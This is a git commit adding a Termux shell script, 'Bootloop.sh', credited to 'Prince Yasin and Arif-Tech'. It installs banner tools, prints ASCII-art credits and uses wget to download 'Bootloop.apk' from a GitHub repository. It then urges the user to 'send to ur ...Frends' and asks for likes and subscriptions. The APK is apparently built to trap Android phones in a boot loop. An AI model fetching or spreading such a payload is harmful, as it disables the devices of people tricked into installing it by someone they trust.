2890617d8bdd9457079deca117f1b95be0a7ac5c
princeyasinzone <38537313+princeyasinzone@users.noreply.github.com>
2018-05-09 12:50:31 +0530

    Add files via upload

---
+++ Bootloop.sh
@@ -0,0 +1,24 @@
+gem install lolcat
+pkg install figlet
+pkg install wget
+pkg install toilet
+clear
+echo
+figlet Prince Yasin |lolcat
+echo
+echo
+echo -e "\033[1m \e[32m ( Made by Prince Yasin and Arif-Tech )"
+echo
+echo
+wget https://github.com/princeyasinzone/Magic/blob/master/Bootloop.apk
+echo
+echo "$(tput setaf 3)Apk Download succsesfuly...send to ur ...Frends...
+........pls LIKE SUBSCRIBE...Thanks...4r...watching.$(tput sgr 0)" | pv -qL 10 ;
+echo
+echo
+echo
+figlet -f slant Arif-Tech | lolcat
+echo
+echo -e "\033[1m \e[32m (Made byPrince Yasin and Arif-Tech )"
+echo
+toilet -F metal -F border -f block Bootloop | lolcat
